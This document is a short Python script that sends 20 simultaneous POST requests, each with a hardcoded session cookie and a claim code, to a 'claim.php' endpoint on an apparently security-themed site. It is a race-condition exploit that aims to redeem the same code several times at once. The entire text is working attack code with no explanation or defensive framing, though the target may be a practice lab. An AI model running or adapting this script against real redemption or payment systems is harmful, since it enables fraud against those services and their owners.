import asyncio
import aiohttp

async def post(url):
    print('POST REQUEST: ', url)
    cookies = {'PHPSESSID': '5q99lf61jsi24jdkc9f1r72q3j'}
    connector = aiohttp.TCPConnector(limit_per_host=50, limit=50)
    async with aiohttp.ClientSession(connector=connector, cookies=cookies) as session:
        async with session.post(url, data={'code':'code1000'}, ) as response:
            pass
            #t = '{0:%H:%M:%S}'.format(datetime.datetime.now())
            #print('Done: {}, {} ({})'.format(t, response.url, response.status))

loop = asyncio.get_event_loop()
url = 'http://infosec-coffee.com/claim.php'
tasks = []
for i in range(20):
    tasks.append(asyncio.ensure_future(post(url)))
loop.run_until_complete(asyncio.wait(tasks))